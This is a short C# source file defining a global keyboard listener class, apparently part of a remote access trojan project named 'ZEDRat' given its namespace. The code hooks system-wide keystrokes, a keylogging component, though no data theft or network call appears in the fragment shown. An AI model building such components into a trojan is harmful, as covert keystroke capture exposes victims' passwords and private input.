using System.Collections.Generic;
using ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation
{
	internal class GlobalKeyListener : KeyListener
	{
		public GlobalKeyListener()
			: base(new Subscribe(HookHelper.HookGlobalKeyboard))
		{
		}

		protected override IEnumerable<KeyPressEventArgsExt> GetPressEventArgs(CallbackData data)
		{
			return KeyPressEventArgsExt.FromRawDataGlobal(data);
		}

		protected override KeyEventArgsExt GetDownUpEventArgs(CallbackData data)
		{
			return KeyEventArgsExt.FromRawDataGlobal(data);
		}
	}
}
